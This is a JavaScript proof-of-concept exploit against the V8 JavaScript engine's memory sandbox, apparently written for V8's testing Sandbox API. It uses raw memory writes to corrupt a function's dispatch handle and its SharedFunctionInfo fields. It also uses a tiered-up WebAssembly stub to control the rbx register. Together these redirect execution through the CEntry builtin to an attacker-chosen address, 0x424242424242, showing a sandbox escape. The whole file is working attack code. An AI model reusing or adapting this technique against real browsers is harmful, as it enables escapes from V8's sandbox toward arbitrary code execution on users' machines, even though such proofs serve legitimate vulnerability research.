const kHeapObjectTag = 1;
const kSmiTagSize = 1;
const kJSFunctionType = Sandbox.getInstanceTypeIdFor("JS_FUNCTION_TYPE");
const kDispatchHandleOffset = Sandbox.getFieldOffset(kJSFunctionType, "dispatch_handle");
const kSharedFunctionInfoOffset = Sandbox.getFieldOffset(kJSFunctionType, "shared_function_info");
const kSharedFunctionInfoType = Sandbox.getInstanceTypeIdFor("SHARED_FUNCTION_INFO_TYPE");
const kTrustedFunctionDataOffset = Sandbox.getFieldOffset(kSharedFunctionInfoType, "trusted_function_data");
const kUnstrustedFunctionDataOffset = Sandbox.getFieldOffset(kSharedFunctionInfoType, "function_data");

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const getPtr = (obj) => Sandbox.getAddressOf(obj) + kHeapObjectTag;
const getField = (ptr, offset) => memory.getUint32(ptr + offset - kHeapObjectTag, true);
const setField = (ptr, offset, value) => memory.setUint32(ptr + offset - kHeapObjectTag, value, true);

// a function that lets us control rbx via the last argument
const {stub} = new WebAssembly.Instance(new WebAssembly.Module(Uint8Array.fromBase64(
    // (module (func (export "stub") (param i64 i64 i64 i64) return))
    "AGFzbQEAAAABCAFgBH5+fn4AAwIBAAcIAQRzdHViAAAKBQEDAA8LAAoEbmFtZQIDAQAA"
))).exports;

// tier it up so it can set rbx
for (let i = 0; i < 0x100000; i++) stub(0n, 0n, 0n, 0n);

const victim = () => {};
// switch to a 0 param handle so we can later tail the CEntry builtin
setField(
    getPtr(victim),
    kDispatchHandleOffset,
    getField(getPtr(Function.__proto__), kDispatchHandleOffset)
);

const call = (addr) => {
    stub(0n, 0n, 0n, addr);
    victim();
};
%PrepareFunctionForOptimization(call);
call(0n);
%OptimizeMaglevOnNextCall(call);
call(1n);

const builtins = Sandbox.getBuiltinNames();
Sandbox.setFunctionCodeToBuiltin(victim, builtins.indexOf("DebugBreakTrampoline"));
const sfiPtr = getField(getPtr(victim), kSharedFunctionInfoOffset);
setField(sfiPtr, kTrustedFunctionDataOffset, 0);
setField(
    sfiPtr,
    kUnstrustedFunctionDataOffset,
    builtins.indexOf("CEntry_Return1_ArgvOnStack_NoBuiltinExit") << kSmiTagSize
);
call(0x424242424242n);